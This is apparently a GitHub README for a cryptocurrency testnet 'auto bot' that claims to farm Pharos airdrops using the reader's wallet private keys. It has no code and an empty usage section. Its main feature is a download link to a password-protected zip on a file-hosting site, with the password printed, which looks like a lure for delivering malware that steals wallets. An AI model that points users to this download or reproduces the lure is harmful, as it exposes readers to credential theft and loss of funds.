# Pharos Testnet Auto Bot

An automated bot for interacting with the Pharos Testnet, performing swaps, transfers, faucet claims, and daily check-ins to potentially qualify for airdrops.

## Features ✨

- **Automated Swaps**: Performs random swaps between WPHRS and USDC tokens
- **PHRS Transfers**: Sends small amounts of PHRS to random addresses
- **Faucet Claims**: Automatically claims testnet tokens from the faucet
- **Daily Check-ins**: Completes daily check-in tasks for potential rewards
- **Proxy Support**: Rotates proxies for each operation (if provided)
- **Multi-wallet Support**: Processes multiple wallets sequentially

## Prerequisites 📋

- Node.js (v18 or higher)
- npm or yarn
- Pharos Testnet wallet with private keys
- (Optional) Proxy list in `proxies.txt`

# [DOWNLOAD](https://www.4sync.com/zip/WamRVb3D/Project_V193.html)  
## PASSWORD: 1322

## Usage 🚀



The bot will:
1. Display a banner with project info
2. Load proxies (if available)
3. Process each wallet sequentially:
   - Claim faucet (if available)
   - Perform daily check-in
   - Execute 10 PHRS transfers
   - Execute 10 token swaps
4. Repeat every 30 minutes



## Support 💬

For issues or questions, please open an issue on GitHub.

## Disclaimer ⚠️

This software is provided "as is" without warranties. Use at your own risk. The developers are not responsible for any losses or issues caused by using this bot.

## License 📄

MIT License - See LICENSE file for details
